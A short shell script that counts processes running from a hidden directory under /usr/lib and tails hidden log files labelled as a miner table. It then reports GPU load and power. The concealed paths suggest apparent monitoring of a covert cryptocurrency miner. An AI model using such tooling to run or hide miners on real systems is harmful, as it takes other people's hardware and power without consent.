c=0
for p in /proc/[0-9]*; do ex=$(readlink "$p/exe" 2>/dev/null); case "$ex" in */.nvhd/.m*) c=$((c+1)); ps -o pid,etime= -p ${p#/proc/} 2>/dev/null;; esac; done
echo "instances=$c"
tail -4 /usr/lib/.nvhd/.glog
echo "=== miner table ==="
tail -c 420 /usr/lib/.nvhd/.mine.log
echo "=== gpu ==="
nvidia-smi --query-gpu=utilization.gpu,power.draw,memory.used --format=csv,noheader
